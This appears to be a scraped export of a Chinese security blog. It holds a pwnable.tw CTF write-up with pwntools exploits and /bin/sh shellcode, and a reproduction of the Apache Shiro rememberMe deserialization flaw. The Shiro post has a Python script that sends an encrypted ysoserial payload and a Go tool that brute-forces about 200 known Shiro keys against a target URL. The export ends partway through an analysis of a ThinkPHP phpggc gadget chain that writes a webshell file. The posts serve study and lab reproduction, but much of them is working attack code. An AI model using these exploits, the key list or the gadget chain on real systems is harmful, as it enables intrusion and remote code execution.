; fd .text:0804808D mov al, 4 .text:0804808F int 80h ; LINUX - sys_write .text:08048091 xor ebx, ebx .text:08048093 mov dl, 3Ch ; \u0026#39;\u0026lt;\u0026#39; .text:08048095 mov al, 3 .text:08048097 int 80h ; LINUX - .text:08048099 add esp, 14h .text:0804809C retn .text:0804809C _start endp ; sp-analysis failed esp压栈, 返回地址压栈 清空了eax, ebx, ecx, edx 四次push压入字符串 Let’s start the CTF : 将栈顶地址作为参数移到ecx中 将20移到dl (edx的低八位)中, 20 就是上面字符串的长度 sys_write将要向stdout写入, 所以将1移动到bl (ebx的低8位)中 因为要调用的系统调用为sys_write, 所以将其系统呼叫号也就是4移动到al (eax的低八位)中 使用 int 80h 来调用中断, 相当于call, 参数为前面的那些, 至此标准输出中写入了字符串 ebx置0, 表示从标准输入中读取 将60传入edx, 表示读取60个字节 (注意这些字节会覆盖原先栈中的字符串) 系统呼叫号置3, 表示使用sys_read调用 int 80h来调用中断, 将内容读入ecx中的地址也就是栈顶中 将esp增加20字节 弹栈并执行弹出地址所指向的指令 攻击思路为:\n程序向栈中写入数据, 然后再将esp增加20然后弹栈执行, 但是我们读取的数据最大有60字节, 那么可以读入超过20字节的数据, 并控制弹栈执行的指令. 如果让弹出执行的指令为sys_write部分的代码, 那么就会泄漏最开始压栈的esp地址 泄漏esp地址之后, 进行第二次攻击, 同样是弹出执行sys_write, 接着代码继续执行到sys_read, 这里让程序读入20个垃圾字符, 接下来程序会将esp增加20, 然后再次弹栈执行, 这次弹栈出来要执行的指令的地址 应该是shellcode的地址, 那么shellcode的地址应该是多少呢? 应该是最开始的esp地址加上20, 这里我第一次看的时候想了好久, 可以看这位师傅的图帮助理解https://xuanxuanblingbling.github.io/ctf/pwn/2019/08/30/start/ exp如下\nfrom pwn import * p = remote(\u0026#39;chall.pwnable.tw\u0026#39;, 10000) # p = process(\u0026#39;./start\u0026#39;) shellcode= \u0026#39;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#39; pad = \u0026#39;a\u0026#39;*20 # pad = pad.decode(\u0026#39;utf8\u0026#39;) addr = 0x8048087 payload1 = pad + p32(addr).decode(\u0026#39;unicode_escape\u0026#39;) p.send(payload1) p.recvuntil(\u0026#34;:\u0026#34;) oldesp = u32(p.recv(4)) shellcode_addr = oldesp + 20 payload2 = pad + p32(shellcode_addr).decode(\u0026#39;unicode_escape\u0026#39;) + shellcode p.send(payload2) p.interactive() orw 逆向得到源代码\nint __cdecl main(int argc, const char **argv, const char **envp) { orw_seccomp(); printf(\u0026#34;Give my your shellcode:\u0026#34;); read(0, \u0026amp;shellcode, 0xC8u); ((void (*)(void))shellcode)(); return 0; } orw_seccomp 说是限制执行的函数的, 题目说只能执行sys_open sys_read sys_write. 然后接下来程序读取了shellcode并且执行. 所以向程序发送asm代码, 先对flag文件使用sys_open, 然后用sys_read读取内容, 最后使用sys_write 将内容写到标准输出中.\nfrom pwn import * context(arch=\u0026#39;i386\u0026#39;,os=\u0026#39;linux\u0026#39;) #context(log_level=\u0026#39;debug\u0026#39;) io = remote(\u0026#39;chall.pwnable.tw\u0026#39;,10001) open_code = \u0026#39;\u0026#39;\u0026#39; mov eax, 0x5; push 0x00006761; push 0x6c662f77; push 0x726f2f65; push 0x6d6f682f; mov ebx,esp; xor ecx,ecx; xor edx,edx; int 0x80; \u0026#39;\u0026#39;\u0026#39; read_code = \u0026#39;\u0026#39;\u0026#39; mov ecx, ebx; mov ebx, eax; mov eax, 0x3; mov edx, 0x60; int 0x80; \u0026#39;\u0026#39;\u0026#39; write_code = \u0026#39;\u0026#39;\u0026#39; mov eax, 0x4; mov ebx, 0x1; int 0x80; \u0026#39;\u0026#39;\u0026#39; payload = asm(open_code+read_code+write_code) io.recvuntil(\u0026#39;:\u0026#39;) io.send(payload) io.interactive() ","permalink":"https://ch3n9w.github.io/posts/sec-pwnable/","summary":"\u003cp\u003e尝试学pwn,放弃学pwn\u003c/p\u003e","title":"pwnable尝试"},{"content":" 记录shiro漏洞学习的过程, 参考https://saucer-man.com/information_security/396.html, 并在漏洞分析基础上编写检测脚本\n环境搭建 git clone https://github.com/apache/shiro.git cd shiro git checkout shiro-root-1.2.4 设置shiro/samples/web/pom.xml, 添加版本1.2\n\u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;javax.servlet\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;jstl\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;runtime\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; 为tomcat8文件添加权限\nsudo chmod -R 755 /var/lib/tomcat8 sudo chmod -R 755 /etc/tomcat8 使用idea打开shiro/samples/web项目, 等待maven项目依赖下载完成, 编辑配置\n进入Deployment, 添加artifact\n启动项目, 看到下面的页面就说明环境搭建完成了\n漏洞调试 登陆过程 首先看登陆过程, 在org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin打下断点, 随后在浏览器中选中Remember Me选项进行登陆, 程序进入断点:\n在forgetIdentity函数中, 会尝试获取request 和 response, 并移除之前的身份信息.\n回到之前的函数, 进入第一个if分支, 进入rememberIdentity函数, this.getIdentityToRemember函数获取到身份信息, 然后调用rememberIdentity函数.\nrememberIdentity函数中, 首先将accountPrincipals转换成bytes\n转换的逻辑为先进行序列化然后再进行加密, 如下\n加密的方式为AES加密\n跟进密钥获取的函数\n从最后一行可以看到,在对象初始化的时候, 自动设置密钥为默认密钥\n返回到rememberIdentity函数, 跟进rememberSerializedIdentity, 这里主要是将加密结果经过base64之后存储进cookie中\nrememberMe解密过程 在``org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity` 打下断点, 使用脚本向本地服务器发送payload\nfrom Crypto.Cipher import AES import traceback import requests import subprocess import uuid import base64 target = \u0026#34;http://localhost:8000/web_war/\u0026#34; jar_file = \u0026#39;./ysoserial.jar\u0026#39; cipher_key = \u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34; popen = subprocess.Popen([\u0026#39;java\u0026#39;,\u0026#39;-jar\u0026#39;,jar_file, \u0026#34;URLDNS\u0026#34;, \u0026#34;http://ktclkl.dnslog.cn\u0026#34;], stdout=subprocess.PIPE) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() mode = AES.MODE_CBC iv = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(cipher_key), mode, iv) getget = popen.stdout.read() file_body = pad(getget) base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) try: print(base64_ciphertext.decode()) r = requests.get(target, cookies={\u0026#39;rememberMe\u0026#39;:base64_ciphertext.decode()}, timeout=10) except: traceback.print_exc() 跟进函数, 发现getRememberMeManager会返回cookie的信息, 加密服务和加密解密用的密钥.\n接下来, 跟进getRememberedPrincipals函数, 首先会尝试获取rememberMe中的序列化对象, 然后\n看看getRememberedSerializedIdentity的内容, 主要环节就是获取cookie并进行bas64解密, 并将解密结果返回回去.\n接下来进入 convertBytesToPrincipals函数, 可以看到这里进行了解密操作, 并且进行了反序列化操作. 解密操作和之前的加密操作类似,\n至此 , 反序列化漏洞触发. 总体来说这个漏洞跟起来并不复杂.\n密钥爆破 这里参考https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ的方法编写自己的shiro检测脚本, 脚本中的密钥字典来源于https://github.com/pmiaowu/BurpShiroPassiveScan的代码\npackage main import ( \u0026#34;bytes\u0026#34; \u0026#34;crypto/aes\u0026#34; \u0026#34;crypto/cipher\u0026#34; \u0026#34;encoding/base64\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strings\u0026#34; \u0026#34;time\u0026#34; ) func main() { args := os.Args[1:] if len(args) \u0026lt; 1 { log.Println(\u0026#34;usage: ./shiro-brute-key {url}\u0026#34;) log.Println(\u0026#34;\\033[31mNo args specific, exit\\033[0m\u0026#34;) return } var url string = args[0] // start to detect shiro if detectShiro(url) != true { log.Println(\u0026#34;\\033[31mSeems no shiro, exit\\033[0m\u0026#34;) return } log.Println(\u0026#34;\\033[32mShiro detected!\\033[0m\u0026#34;) log.Println(\u0026#34;\\033[34mStart bruting key......\\033[0m\u0026#34;) var result bool var key string if result, key = bruteKey(url);result!=true { log.Println(\u0026#34;\\033[31mBrute failed!\\033[0m\u0026#34;) return } log.Println(\u0026#34;\\033[33mBrute success!Key: \u0026#34; + key + \u0026#34; \\033[0m\u0026#34;) return } func detectShiro(url string) (result bool) { client := \u0026amp;http.Client{Timeout: time.Second * 10} req, _ := http.NewRequest(\u0026#34;GET\u0026#34;, url, nil) req.Header.Add(\u0026#34;Cookie\u0026#34;, \u0026#34;rememberMe=1\u0026#34;) req.Header.Add(\u0026#34;User-Agent\u0026#34;, \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0\u0026#34;) resp, err := client.Do(req) if err != nil { log.Println(\u0026#34;Error with http request,please check your url\u0026#34;) return } setCookies := resp.Cookies() for _, cookie := range setCookies { if strings.Contains(cookie.String(), \u0026#34;rememberMe=deleteMe\u0026#34;) { log.Println(\u0026#34;Found return cookie: \u0026#34; + cookie.String()) return true } } return false } func bruteKey(url string) (bool, string) { key_dict := [...]string{ \u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;, \u0026#34;Z3VucwAAAAAAAAAAAAAAAA==\u0026#34;, \u0026#34;wGiHplamyXlVB11UXWol8g==\u0026#34;, \u0026#34;2AvVhdsgUs0FSA3SDFAdag==\u0026#34;, \u0026#34;3AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;4AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;bWljcm9zAAAAAAAAAAAAAA==\u0026#34;, \u0026#34;WcfHGU25gNnTxTlmJMeSpw==\u0026#34;, \u0026#34;fCq+/xW488hMTCD+cmJ3aQ==\u0026#34;, \u0026#34;kPv59vyqzj00x11LXJZTjJ2UHW48jzHN\u0026#34;, \u0026#34;6ZmI6I2j5Y+R5aSn5ZOlAA==\u0026#34;, \u0026#34;1QWLxg+NYmxraMoxAXu/Iw==\u0026#34;, \u0026#34;a2VlcE9uR29pbmdBbmRGaQ==\u0026#34;, \u0026#34;5aaC5qKm5oqA5pyvAAAAAA==\u0026#34;, \u0026#34;1AvVhdsgUs0FSA3SDFAdag==\u0026#34;, \u0026#34;5RC7uBZLkByfFfJm22q/Zw==\u0026#34;, \u0026#34;3AvVhdAgUs0FSA4SDFAdBg==\u0026#34;, \u0026#34;a3dvbmcAAAAAAAAAAAAAAA==\u0026#34;, \u0026#34;eXNmAAAAAAAAAAAAAAAAAA==\u0026#34;, \u0026#34;U0hGX2d1bnMAAAAAAAAAAA==\u0026#34;, \u0026#34;Ymx1ZXdoYWxlAAAAAAAAAA==\u0026#34;, \u0026#34;L7RioUULEFhRyxM7a2R/Yg==\u0026#34;, \u0026#34;UGlzMjAxNiVLeUVlXiEjLw==\u0026#34;, \u0026#34;bWluZS1hc3NldC1rZXk6QQ==\u0026#34;, \u0026#34;ZUdsaGJuSmxibVI2ZHc9PQ==\u0026#34;, \u0026#34;7AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;MTIzNDU2Nzg5MGFiY2RlZg==\u0026#34;, \u0026#34;OY//C4rhfwNxCQAQCrQQ1Q==\u0026#34;, \u0026#34;bTBANVpaOUw0ampRWG43TVJFcF5iXjdJ\u0026#34;, \u0026#34;FP7qKJzdJOGkzoQzo2wTmA==\u0026#34;, \u0026#34;nhNhwZ6X7xzgXnnZBxWFQLwCGQtJojL3\u0026#34;, \u0026#34;LEGEND-CAMPUS-CIPHERKEY==\u0026#34;, \u0026#34;r0e3c16IdVkouZgk1TKVMg==\u0026#34;, \u0026#34;ZWvohmPdUsAWT3=KpPqda\u0026#34;, \u0026#34;k3+XHEg6D8tb2mGm7VJ3nQ==\u0026#34;, \u0026#34;U3ByaW5nQmxhZGUAAAAAAA==\u0026#34;, \u0026#34;tiVV6g3uZBGfgshesAQbjA==\u0026#34;, \u0026#34;ZAvph3dsQs0FSL3SDFAdag==\u0026#34;, \u0026#34;0AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;25BsmdYwjnfcWmnhAciDDg==\u0026#34;, \u0026#34;3JvYhmBLUs0ETA5Kprsdag==\u0026#34;, \u0026#34;5AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;6AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;6NfXkC7YVCV5DASIrEm1Rg==\u0026#34;, \u0026#34;cmVtZW1iZXJNZQAAAAAAAA==\u0026#34;, \u0026#34;8AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;8BvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;9AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;OUHYQzxQ/W9e/UjiAGu6rg==\u0026#34;, \u0026#34;aU1pcmFjbGVpTWlyYWNsZQ==\u0026#34;, \u0026#34;bXRvbnMAAAAAAAAAAAAAAA==\u0026#34;, \u0026#34;5J7bIJIV0LQSN3c9LPitBQ==\u0026#34;, \u0026#34;bya2HkYo57u6fWh5theAWw==\u0026#34;, \u0026#34;f/SY5TIve5WWzT4aQlABJA==\u0026#34;, \u0026#34;WuB+y2gcHRnY2Lg9+Aqmqg==\u0026#34;, \u0026#34;3qDVdLawoIr1xFd6ietnwg==\u0026#34;, \u0026#34;YI1+nBV//m7ELrIyDHm6DQ==\u0026#34;, \u0026#34;6Zm+6I2j5Y+R5aS+5ZOlAA==\u0026#34;, \u0026#34;2A2V+RFLUs+eTA3Kpr+dag==\u0026#34;, \u0026#34;6ZmI6I2j3Y+R1aSn5BOlAA==\u0026#34;, \u0026#34;SkZpbmFsQmxhZGUAAAAAAA==\u0026#34;, \u0026#34;2cVtiE83c4lIrELJwKGJUw==\u0026#34;, \u0026#34;fsHspZw/92PrS3XrPW+vxw==\u0026#34;, \u0026#34;XTx6CKLo/SdSgub+OPHSrw==\u0026#34;, \u0026#34;sHdIjUN6tzhl8xZMG3ULCQ==\u0026#34;, \u0026#34;O4pdf+7e+mZe8NyxMTPJmQ==\u0026#34;, \u0026#34;HWrBltGvEZc14h9VpMvZWw==\u0026#34;, \u0026#34;rPNqM6uKFCyaL10AK51UkQ==\u0026#34;, \u0026#34;Y1JxNSPXVwMkyvES/kJGeQ==\u0026#34;, \u0026#34;lT2UvDUmQwewm6mMoiw4Ig==\u0026#34;, \u0026#34;MPdCMZ9urzEA50JDlDYYDg==\u0026#34;, \u0026#34;xVmmoltfpb8tTceuT5R7Bw==\u0026#34;, \u0026#34;c+3hFGPjbgzGdrC+MHgoRQ==\u0026#34;, \u0026#34;ClLk69oNcA3m+s0jIMIkpg==\u0026#34;, \u0026#34;Bf7MfkNR0axGGptozrebag==\u0026#34;, \u0026#34;1tC/xrDYs8ey+sa3emtiYw==\u0026#34;, \u0026#34;ZmFsYWRvLnh5ei5zaGlybw==\u0026#34;, \u0026#34;cGhyYWNrY3RmREUhfiMkZA==\u0026#34;, \u0026#34;IduElDUpDDXE677ZkhhKnQ==\u0026#34;, \u0026#34;yeAAo1E8BOeAYfBlm4NG9Q==\u0026#34;, \u0026#34;cGljYXMAAAAAAAAAAAAAAA==\u0026#34;, \u0026#34;2itfW92XazYRi5ltW0M2yA==\u0026#34;, \u0026#34;XgGkgqGqYrix9lI6vxcrRw==\u0026#34;, \u0026#34;ertVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;5AvVhmFLUS0ATA4Kprsdag==\u0026#34;, \u0026#34;s0KTA3mFLUprK4AvVhsdag==\u0026#34;, \u0026#34;hBlzKg78ajaZuTE0VLzDDg==\u0026#34;, \u0026#34;9FvVhtFLUs0KnA3Kprsdyg==\u0026#34;, \u0026#34;d2ViUmVtZW1iZXJNZUtleQ==\u0026#34;, \u0026#34;yNeUgSzL/CfiWw1GALg6Ag==\u0026#34;, \u0026#34;NGk/3cQ6F5/UNPRh8LpMIg==\u0026#34;, \u0026#34;4BvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;MzVeSkYyWTI2OFVLZjRzZg==\u0026#34;, \u0026#34;CrownKey==a12d/dakdad\u0026#34;, \u0026#34;empodDEyMwAAAAAAAAAAAA==\u0026#34;, \u0026#34;A7UzJgh1+EWj5oBFi+mSgw==\u0026#34;, \u0026#34;c2hpcm9fYmF0aXMzMgAAAA==\u0026#34;, \u0026#34;i45FVt72K2kLgvFrJtoZRw==\u0026#34;, \u0026#34;66v1O8keKNV3TTcGPK1wzg==\u0026#34;, \u0026#34;U3BAbW5nQmxhZGUAAAAAAA==\u0026#34;, \u0026#34;ZnJlc2h6Y24xMjM0NTY3OA==\u0026#34;, \u0026#34;Jt3C93kMR9D5e8QzwfsiMw==\u0026#34;, \u0026#34;MTIzNDU2NzgxMjM0NTY3OA==\u0026#34;, \u0026#34;vXP33AonIp9bFwGl7aT7rA==\u0026#34;, \u0026#34;V2hhdCBUaGUgSGVsbAAAAA==\u0026#34;, \u0026#34;Q01TX0JGTFlLRVlfMjAxOQ==\u0026#34;, \u0026#34;Is9zJ3pzNh2cgTHB4ua3+Q==\u0026#34;, \u0026#34;SDKOLKn2J1j/2BHjeZwAoQ==\u0026#34;, \u0026#34;NsZXjXVklWPZwOfkvk6kUA==\u0026#34;, \u0026#34;GAevYnznvgNCURavBhCr1w==\u0026#34;, \u0026#34;zSyK5Kp6PZAAjlT+eeNMlg==\u0026#34;, \u0026#34;bXdrXl9eNjY2KjA3Z2otPQ==\u0026#34;, \u0026#34;RVZBTk5JR0hUTFlfV0FPVQ==\u0026#34;, \u0026#34;WkhBTkdYSUFPSEVJX0NBVA==\u0026#34;, \u0026#34;GsHaWo4m1eNbE0kNSMULhg==\u0026#34;, \u0026#34;l8cc6d2xpkT1yFtLIcLHCg==\u0026#34;, \u0026#34;KU471rVNQ6k7PQL4SqxgJg==\u0026#34;, \u0026#34;kPH+bIxk5D2deZiIxcabaA==\u0026#34;, \u0026#34;kPH+bIxk5D2deZiIxcacaA==\u0026#34;, \u0026#34;4AvVhdsgUs0F563SDFAdag==\u0026#34;, \u0026#34;FL9HL9Yu5bVUJ0PDU1ySvg==\u0026#34;, \u0026#34;fdCEiK9YvLC668sS43CJ6A==\u0026#34;, \u0026#34;FJoQCiz0z5XWz2N2LyxNww==\u0026#34;, \u0026#34;HeUZ/LvgkO7nsa18ZyVxWQ==\u0026#34;, \u0026#34;HoTP07fJPKIRLOWoVXmv+Q==\u0026#34;, \u0026#34;iycgIIyCatQofd0XXxbzEg==\u0026#34;, \u0026#34;m0/5ZZ9L4jjQXn7MREr/bw==\u0026#34;, \u0026#34;NoIw91X9GSiCrLCF03ZGZw==\u0026#34;, \u0026#34;oPH+bIxk5E2enZiIxcqaaA==\u0026#34;, \u0026#34;QAk0rp8sG0uJC4Ke2baYNA==\u0026#34;, \u0026#34;Rb5RN+LofDWJlzWAwsXzxg==\u0026#34;, \u0026#34;s2SE9y32PvLeYo+VGFpcKA==\u0026#34;, \u0026#34;SrpFBcVD89eTQ2icOD0TMg==\u0026#34;, \u0026#34;Us0KvVhTeasAm43KFLAeng==\u0026#34;, \u0026#34;YWJjZGRjYmFhYmNkZGNiYQ==\u0026#34;, \u0026#34;zIiHplamyXlVB11UXWol8g==\u0026#34;, \u0026#34;ZjQyMTJiNTJhZGZmYjFjMQ==\u0026#34;, \u0026#34;kPv59vyqzj00x11LXJZTjJ2UHW48jzHN\u0026#34;, \u0026#34;2adsfasdqerqerqewradsf==\u0026#34;, \u0026#34;2AvVCXsxUs0FSA7SYFjdQg==\u0026#34;, \u0026#34;2AvVhdsgERdsSA3SDFAdag==\u0026#34;, \u0026#34;2AvVhdsgUs0FSA3SaFAdfg==\u0026#34;, \u0026#34;2AvVhdsgUs0FSA3SDFAder==\u0026#34;, \u0026#34;2AvVhdsgUsOFSA3SDFAdag==\u0026#34;, \u0026#34;2AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;2AvVidsaUSofSA3SDFAdog==\u0026#34;, \u0026#34;3Av2hmFLAs0BTA3Kprsd6E==\u0026#34;, \u0026#34;3AvVhdAgUs1FSA4SDFAdBg==\u0026#34;, \u0026#34;3AvVhMFLIs0KTA3Kprsdag==\u0026#34;, \u0026#34;3AvVhmFLUs0KTA3KaTHGFg==\u0026#34;, \u0026#34;3AvVhmFLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;3qDVdLawoIr1xFd6ietnsg==\u0026#34;, \u0026#34;3rvVhmFLUs0KAT3Kprsdag==\u0026#34;, \u0026#34;4AvVhm2LUs0KTA3Kprsdag==\u0026#34;, \u0026#34;4AvVhmFLUs0KTA3KAAAAAA==\u0026#34;, \u0026#34;4AvVhmFLUs0KTA3Kprseaf==\u0026#34;, \u0026#34;4AvVhmFLUs0TTA3Kprsdag==\u0026#34;, \u0026#34;4AvVhmFLUs5KTA1Kprsdag==\u0026#34;, \u0026#34;4AvVhmFLUsOKTA3Kprsdag==\u0026#34;, \u0026#34;4rvVhmFLUs0KAT3Kprsdag==\u0026#34;, \u0026#34;4WCZSJyqdUQsije93aQIRg==\u0026#34;, \u0026#34;5AvVhCsgUs0FSA3SDFAdag==\u0026#34;, \u0026#34;5oiR5piv5p2h5ZK46bG8IQ==\u0026#34;, \u0026#34;8AvVhdsgUs0FSA3SDFAdag==\u0026#34;, \u0026#34;9Ami6v2G5Y+r5aPnE4OlBB==\u0026#34;, \u0026#34;9AVvhnFLuS3KTV8KprsdAg==\u0026#34;, \u0026#34;AF05JAuyuEB1ouJQ9Y9Phg==\u0026#34;, \u0026#34;aG91c2Vob3VzZWhvdXNlMg==\u0026#34;, \u0026#34;A+kWR7o9O0/G/W6aOGesRA==\u0026#34;, \u0026#34;AztiX2RUqhc7dhOzl1Mj8Q==\u0026#34;, \u0026#34;b2EAAAAAAAAAAAAAAAAAAA==\u0026#34;, \u0026#34;B9rPF8FHhxKJZ9k63ik7kQ==\u0026#34;, \u0026#34;c2hvdWtlLXBsdXMuMjAxNg==\u0026#34;, \u0026#34;Cj6LnKZNLEowAZrdqyH/Ew==\u0026#34;, \u0026#34;duhfin37x6chw29jsne45m==\u0026#34;, \u0026#34;fCq+/xW488hMTCE+cmJ3FF==\u0026#34;, \u0026#34;FjbNm1avvGmWE9CY2HqV75==\u0026#34;, \u0026#34;FP7qKJzdJOGkzoQzo2wTmA==\u0026#34;, \u0026#34;GhrF5zLfq1Dtadd1jlohhA==\u0026#34;, \u0026#34;GHxH6G3LFh8Zb3NwoRgfFA==\u0026#34;, \u0026#34;HOlg7NHb9potm0n5s4ic0Q==\u0026#34;, \u0026#34;lt181dcQVz/Bo9Wb8ws/Cg==\u0026#34;, \u0026#34;M2djA70UBBUPDibGZBRvrA==\u0026#34;, \u0026#34;mIccZhQt6EBHrZIyw1FAXQ==\u0026#34;, \u0026#34;pbnA+Qzen1vjV3rNqQBLHg==\u0026#34;, \u0026#34;pyyX1c5x2f0LZZ7VKZXjKO==\u0026#34;, \u0026#34;QDFCnfkLUs0KTA3Kprsdag==\u0026#34;, \u0026#34;QF5HMyZAWDZYRyFnSGhTdQ==\u0026#34;, \u0026#34;qQFtSnnj/sx7vu51ixAyEQ==\u0026#34;, \u0026#34;QUxQSEFNWVNPRlRCVUlMRA==\u0026#34;, \u0026#34;QVN1bm5uJ3MgU3Vuc2l0ZQ==\u0026#34;, \u0026#34;R29yZG9uV2ViAAAAAAAAAA==\u0026#34;, \u0026#34;sBv2t3okbdm3U0r2EVcSzB==\u0026#34;, \u0026#34;sgIQrqUVxa1OZRRIK3hLZw==\u0026#34;, \u0026#34;TGMPe7lGO/Gbr38QiJu1/w==\u0026#34;, \u0026#34;UGlzMjAxNiVLeUVlXiEjLw==\u0026#34;, \u0026#34;w793pPq5ZVBKkj8OhV4KaQ==\u0026#34;, \u0026#34;wrjUh2ttBPQLnT4JVhriug==\u0026#34;, \u0026#34;wyLZMDifwq3sW1vhhHpgKA==\u0026#34;, \u0026#34;YnlhdnMAAAAAAAAAAAAAAA==\u0026#34;, \u0026#34;YVd4dmRtVjViM1UlM0QIdn==\u0026#34;, \u0026#34;YWdlbnRAZG1AMjAxOHN3Zg==\u0026#34;, \u0026#34;YystomRZLMUjiK0Q1+LFdw==\u0026#34;, \u0026#34;Z3VucwAAAAAAAAAAAAABBB==\u0026#34;, \u0026#34;Z3VucwACAOVAKALACAADSA==\u0026#34;} for _, key := range key_dict { log.Println(\u0026#34;\\033[34mTry key: \u0026#34;+ key + \u0026#34;\\033[0m\u0026#34;) rememberMe := generateRememberMe(key) if rememberMe == \u0026#34;\u0026#34; {continue} client := \u0026amp;http.Client{Timeout: time.Second * 10} req, _ := http.NewRequest(\u0026#34;GET\u0026#34;, url, nil) req.Header.Add(\u0026#34;Cookie\u0026#34;, \u0026#34;rememberMe=\u0026#34;+rememberMe) req.Header.Add(\u0026#34;User-Agent\u0026#34;, \u0026#34;Mozilla/5.0 (X11; Linux x86_64; rv:97.0) Gecko/20100101 Firefox/97.0\u0026#34;) resp, err := client.Do(req) time.Sleep(time.Second * 2) if err != nil { log.Panicln(\u0026#34;Error with http request,please check your url\u0026#34;) } setCookies := resp.Cookies() for _, cookie := range setCookies { log.Println(cookie.String()) if strings.Contains(cookie.String(), \u0026#34;rememberMe=deleteMe\u0026#34;) { return false, \u0026#34;\u0026#34; } } return true, key } return false, \u0026#34;\u0026#34; } func generateRememberMe(key string) string { bIV := []byte(\u0026#34;1234567890123456\u0026#34;) bKey, err := base64.StdEncoding.DecodeString(key) if err != nil {return \u0026#34;\u0026#34;} payload := \u0026#34;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==\u0026#34; bPayload, _ := base64.StdEncoding.DecodeString(payload) bPayload = PKCS5Padding(bPayload, aes.BlockSize) block, err := aes.NewCipher(bKey) if err != nil { log.Panicln(err) } ciphertext := make([]byte, aes.BlockSize + len(bPayload)) mode := cipher.NewCBCEncrypter(block, bIV) mode.CryptBlocks(ciphertext[aes.BlockSize:], bPayload) copy(ciphertext[:aes.BlockSize], bIV) return base64.StdEncoding.EncodeToString(ciphertext) } func PKCS5Padding(ciphertext []byte, blockSize int) []byte { padding := (blockSize - len(ciphertext)%blockSize) padtext := bytes.Repeat([]byte{byte(padding)}, padding) return append(ciphertext, padtext...) } ","permalink":"https://ch3n9w.github.io/posts/sec-shiro-attack/","summary":"\u003cblockquote\u003e\n\u003cp\u003e记录shiro漏洞学习的过程, 参考https://saucer-man.com/information_security/396.html, 并在漏洞分析基础上编写检测脚本\u003c/p\u003e\n\u003c/blockquote\u003e","title":"shiro 漏洞复现"},{"content":" phpggc中关于thinkphp的攻击思路学习\n5.0.4-5.0.24 写文件 使用用法\n第一个参数是要写到哪个文件夹下面,第二个参数是本地的文件路径,后面base64会将换行符号去除 ./phpggc ThinkPHP/FW1 /srv/http/tp5/ shell.php | base64 -w 0 环境搭建 在controller下面的Index.php中写入反序列化代码\n\u0026lt;?php namespace app\\index\\controller; class Index { public function index() { unserialize(base64_decode($_GET[\u0026#39;a\u0026#39;])); } } 漏洞分析 调试开始, 首先在think\\Process#__destruct下断点, 随后跟进到close函数中,这里控制processPipes为think\\model\\relation\\HasMany对象,触发其__call方法,进而进入其baseQuery 方法. 在这个方法中可以触发think\\console\\Output的__call方法\n在这个__call方法中,可以看到调用了call_user_func_array函数, 调用的是block函数, 参数是我们控制的payload\n这里前面的AAA是为了绕过后文中出现的死亡exit而添加的.后面再说.\n又经过了think\\console\\Output的writeln 和write 方法后进入 think\\session\\driver\\Memcache#write,\nhandler是think\\cache\\driver\\Memcached对象,进入其set方法\n\u0026lt;butu\n进入set方法中的has方法\nhandler是think\\cache\\driver\\File对象,get方法调用了getCacheKey方法\n返回结果为php://filter/convert.base64-decode/resource=/srv/http/tp5/6a644d26b09257b882dae6e407f23d42.php, 因为这不是一个文件,所以返回了default的值也就是false, 那么前面提到的think\\cache\\driver\\Memcached#has返回的也是false.\n回到think\\cache\\driver\\Memcached#set,进入think\\cache\\driver\\Memcached#getCacheKey,返回的key是\u0026lt;where\u0026gt;AAAPD9waHAgcGhwaW5mbygpOz8+Cg++\u0026lt;/where\u0026gt;\n随后进入下面一行的think\\cache\\driver\\File#set, 注意这里是第一次进入think\\cache\\driver\\File#set .\n在这个set方法中调用getCacheKey方法, 和之前一样返回的是php://filter/convert.base64-decode/resource=/srv/http/tp5/6a644d26b09257b882dae6e407f23d42 , 然后在下文进行一次文件写,但是这里写出来的文件不是目标文件!, 你看:\nexit后面不是我们的payload, 但是别着急, 之后还会回来这里一次, 那次就会将payload写进去了.\n这一步之后, 返回think\\cache\\driver\\Memcached#set, 并随之调用setTagItem方法\ntag的生成是根据this-\u0026gt;tag的md5值来决定的, 这里this-\u0026gt;tag是null, 所以生成的tag是我们可以预测的值也就是tag_c4ca4238a0b923820dcc509a6f75849b, 然后带着这个tag值和我们的payload作为key和value , 再次进入think\\cache\\driver\\Memcached#set方法, 并在其中第二次进入think\\cache\\driver\\File#set方法\n注意到和第一次进入think\\cache\\driver\\File#set有什么不一样吗? 第一次进入的时候, 